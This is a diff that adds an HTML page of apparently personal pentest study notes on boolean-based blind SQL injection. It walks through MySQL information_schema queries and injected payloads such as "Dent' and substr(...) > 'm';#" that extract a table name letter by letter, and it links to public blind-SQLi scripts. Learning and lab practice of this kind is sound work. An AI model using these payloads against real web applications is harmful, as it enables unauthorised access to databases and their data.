@@ -1,0 +1,70 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>table_name</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>table_name</h1><br /><span style="color:#a5452a;">example:</span><br />In the database as first
+    entry we have the table <code>CHARACTER_SETS</code><br />
+    <div class="codebox">
+      <div class="codebox">
+        mysql&gt;&nbsp;select&nbsp;table_name&nbsp;from&nbsp;information_schema.tables&nbsp;limit&nbsp;1;</div>
+    </div><br /> <a href=""><img src="images/1691-1.png" alt="images/1691-1.png" /></a><br />The first character of the
+    name of this table is <code>C</code><br />
+    <div class="codebox">
+      <div class="codebox">
+        mysql&gt;&nbsp;select&nbsp;substr((select&nbsp;table_name&nbsp;from&nbsp;information_schema.tables&nbsp;limit&nbsp;1),1,1)&nbsp;as&nbsp;ExtractStringMine;
+      </div>
+    </div><br /> <a href=""><img src="images/1691-2.png" alt="images/1691-2.png" /></a><br />How to reconstruct the name
+    of this first table if the Web Application does return only TRUE(return the result) or FALSE(return no
+    result)?<br /> <span style="text-decoration:underline;">We need to go by trial and error!</span><br /><span
+      style="text-decoration:underline;">Query:</span> SELECT * FROM Users WHERE lname=&#39;<span
+      style="color:#f6ff00;">&lt;OUR INPUT&gt;</span>&#39;;<br />• <span style="color:#f6ff00;">&lt;OUR
+      INPUT&gt;</span><br /> ◇ <span style="text-decoration:underline;">SQLi Prefix:</span> Dent&#39; AND <br /> ◇ <span
+      style="text-decoration:underline;">Binary Condition:</span> <br /> ▪ Binary Inject 1: substr((select table_name
+    from information_schema.tables limit 1),1,1) &gt; &quot;m&quot;<br />
+    <div class="codebox">
+      <div class="codebox">
+        Dent&#39;&nbsp;and&nbsp;substr((select&nbsp;table_name&nbsp;from&nbsp;information_schema.tables&nbsp;limit&nbsp;1),1,1)&nbsp;&gt;&nbsp;&quot;m&quot;;#
+      </div>
+    </div><br /> <a href=""><img src="images/1691-3.png" alt="images/1691-3.png" /></a><br /> <span
+      style="color:#ff0000;">FALSE!</span><br /> ▪ Binary Inject 2: substr((select table_name from
+    information_schema.tables limit 1),1,1) &gt; &quot;g&quot;<br />
+    <div class="codebox">
+      <div class="codebox">
+        Dent&#39;&nbsp;and&nbsp;substr((select&nbsp;table_name&nbsp;from&nbsp;information_schema.tables&nbsp;limit&nbsp;1),1,1)&nbsp;&gt;&nbsp;&quot;g&quot;;#
+      </div>
+    </div><br /> <a href=""><img src="images/1691-4.png" alt="images/1691-4.png" /></a><br /> <span
+      style="color:#ff0000;">FALSE!</span><br /> ▪ Binary Inject 4: substr((select table_name from
+    information_schema.tables limit 1),1,1) &gt; &quot;b&quot;<br />
+    <div class="codebox">
+      <div class="codebox">
+        Dent&#39;&nbsp;and&nbsp;substr((select&nbsp;table_name&nbsp;from&nbsp;information_schema.tables&nbsp;limit&nbsp;1),1,1)&nbsp;&gt;&nbsp;&quot;b&quot;;#
+      </div>
+    </div> <br /> <a href=""><img src="images/1691-5.png" alt="images/1691-5.png" /></a><br /> <span
+      style="color:#00ff00;">TRUE!</span><br /> ▪ Binary Inject 5: substr((select table_name from
+    information_schema.tables limit 1),1,1) = &quot;c&quot;<br />
+    <div class="codebox">
+      <div class="codebox">
+        Dent&#39;&nbsp;and&nbsp;substr((select&nbsp;table_name&nbsp;from&nbsp;information_schema.tables&nbsp;limit&nbsp;1),1,1)&nbsp;=&nbsp;&quot;C&quot;;#
+      </div>
+    </div><br /> <a href=""><img src="images/1691-6.png" alt="images/1691-6.png" /></a><br /> <span
+      style="color:#00ff00;">TRUE! We have found that the first letter of the table name is </span><strong><span
+        style="color:#ff8700;">c</span></strong><br /> ◇ <span style="text-decoration:underline;">SQLi Suffix:</span>
+    ;#<br /><br /><br /><strong>Tools(scripts)</strong><br />Because exploit this vulnerability manually can take a lot
+    of time take in considerations to write your own script or use one that you can find online like these (not tested
+    yet): <br /> ◇ <a
+      href="https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py" target="_blank">https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py</a>
+    (python)<br /> ◇ <a
+      href="https://github.com/ivanitlearning/Blind_SQL_injection_script" target="_blank">https://github.com/ivanitlearning/Blind_SQL_injection_script</a>
+    (bash)
+  </div>
+</body>
+
+</html>
